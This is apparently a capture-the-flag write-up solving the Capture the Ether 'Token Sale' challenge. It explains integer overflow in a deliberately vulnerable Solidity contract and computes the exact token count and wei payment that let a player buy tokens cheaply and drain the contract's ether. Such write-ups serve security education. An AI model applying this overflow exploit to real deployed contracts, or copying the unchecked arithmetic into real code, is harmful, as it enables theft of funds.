# Token sale

## Challenge
Source: https://capturetheether.com/challenges/math/token-sale/
>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.
>
>The contract starts off with a balance of 1 ether. See if you can take some of that away.
```
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

```
## Solution

This contract challenge title is a bit of a misnomer. It has the foundational elements of a token contract, but without following any established standard. It also has no means to track the tokens outside of this particular contract. Ideally, an initial coin offering (ICO) would consist of two separate smart contracts. One smart contract to create and track ownership of the tokens and then another contract to deal with raising funds from the token sale.

This contract will hold ```ether```, and in return it adjusts a state variable ```mapping``` addresses to an unsigned integer which denotes a balance. This integer is incremented according to the participant's ```msg.value```, and decremented when a participant calls the ```sell``` function.

The exploit to this puzzle starts with the ```balanceOf``` mapping to an unsigned integer. Unsigned integer state variables that can be re-assigned are potentially vulnerable to integer under/overflow.

Integer overflow is the result of exceeding the maximum value that can be assigned to the value type. In Solidity/Ethereum, the largest integer is ```2**256 - 1```. The result of adding just one more to this value is a return value of zero. To demonstrate this further, in Solidity:

Overflow example:
```
(2**256 - 1) + 4 == 3
```

Underflow example:
```
0 - 1 == 2**256 - 1
```

With that said:
```
0 == 2**256
```

The second piece to this puzzle is the contract state constant ```PRICE_PER_TOKEN``` that declared a token value of ```1 ether```. Remember ```1 ether``` is equal to ```1 * 10**18 wei``` in order to compensate for a lack of decimal value support in Solidity.


To solve this problem, first determine overflow max value which is ```== 2**256```, or:
```
115792089237316195423570985008687907853269984665640564039457584007913129639936
```

Determine largest integer available to ```uint256``` declaration ```== 2**256 - 1```:
```
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

Divide this max value by ```1 ether``` (which is solidity short hand for ```1000000000000000000 wei```):
```
(2**256 - 1) / 1 ether == 115792089237316195423570985008687907853269984665640564039457.584007913129639935
```

Round up, and this is how many tokens we will buy in the function call:
```
115792089237316195423570985008687907853269984665640564039458
```

Now to determine the appropriate ```msg.value```. Consider the require statement and argument in the ```buy``` function:
```
function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);
```
Let's reconfigure these values, solving for ```msg.value```:
```
msg.value == (uint256 numToken * PRICE_PER_TOKEN)
msg.value == (115792089237316195423570985008687907853269984665640564039458 * 1000000000000000000)
msg.value == 115792089237316195423570985008687907853269984665640564039458000000000000000000
```
Before we go on, recall the following:
```
2**256  == 115792089237316195423570985008687907853269984665640564039457584007913129639936
```

Compare the ```msg.value``` calculated above to ```2**256```. The ```msg.value``` is a larger number than a ```uint256``` value type will allow. We now have our overflow.

To explain the concept using a scenario you probably encounter on a daily basis, consider a 12 hour clock vs a 24 hour clock:
```
23 hours  == 23 % 12 == 11 hours
05 hours  == 5 % 12 == 5 hours
```

Think of our unsigned integer as one giant clock. We can do the same thing to determine our ```msg.value```:
```
msg.value % 2**256 == 115792089237316195423570985008687907853269984665640564039458000000000000000000 % 2**256 == 415992086870360064

msg.value == 415992086870360064 wei
msg.value == 0.415992086870360064 ether
```

Alternatively:
```
msg.value == (uint256 numToken * PRICE_PER_TOKEN)
msg.value == (115792089237316195423570985008687907853269984665640564039458 * 1000000000000000000)
msg.value == 115792089237316195423570985008687907853269984665640564039458000000000000000000
  2**256  == 115792089237316195423570985008687907853269984665640564039457584007913129639936
  
msg.value - 2**256 = 415992086870360064

  115792089237316195423570985008687907853269984665640564039458000000000000000000
- 115792089237316195423570985008687907853269984665640564039457584007913129639936
--------------------------------------------------------------------------------
                                                              415992086870360064

  584007913129639936
+ 415992086870360064
--------------------
 1000000000000000000 == 1*(10**18)
```

Triple check the calculation using the solidity contract below:
```
contract cove {
    function check() view public returns(uint256){
        // this is how much you pay in wei
        return (115792089237316195423570985008687907853269984665640564039458 * 1 ether) % 2**256;
    }
}
```
To solve this challenge, call the ```buy``` function using:
* msg.value(denominated in wei) ==  ```'415992086870360064'```
* numToken == ```'115792089237316195423570985008687907853269984665640564039458'```

Then raid ```1 ether``` of the ```1.415992086870360064 ether``` of the smart contract's balance by calling the ```sell``` function on ```1``` of your ```115792089237316195423570985008687907853269984665640564039458 tokens```.
